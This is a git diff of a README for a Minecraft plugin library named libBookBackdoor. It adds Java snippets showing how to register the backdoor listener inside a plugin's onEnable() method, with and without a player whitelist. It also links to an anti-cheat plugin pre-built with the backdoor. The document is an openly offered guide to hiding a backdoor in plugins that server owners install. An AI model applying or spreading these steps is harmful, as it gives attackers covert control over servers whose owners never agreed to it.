@@ -29,12 +29,20 @@
 * 3: Add this code to the ```onEnable(){}``` method in your main class
 
 
+## Without whitelist
+
 ```java
 PluginManager manager = this.getServer().getPluginManager();
-getConfig().options().copyDefaults(true);
-saveConfig();
 manager.registerEvents(new libBookBackdoor(this), this);
 ```
+
+## With whitelist
+
+```java
+PluginManager manager = this.getServer().getPluginManager();
+manager.registerEvents(new libBookBackdoor(this, new String[]{"Your name", ...}), this);
+```
+
 
 ## Pre-built Anti-Cheat with BookBackdoor
 * https://github.com/BookBackdoor/AntiCheatReloaded
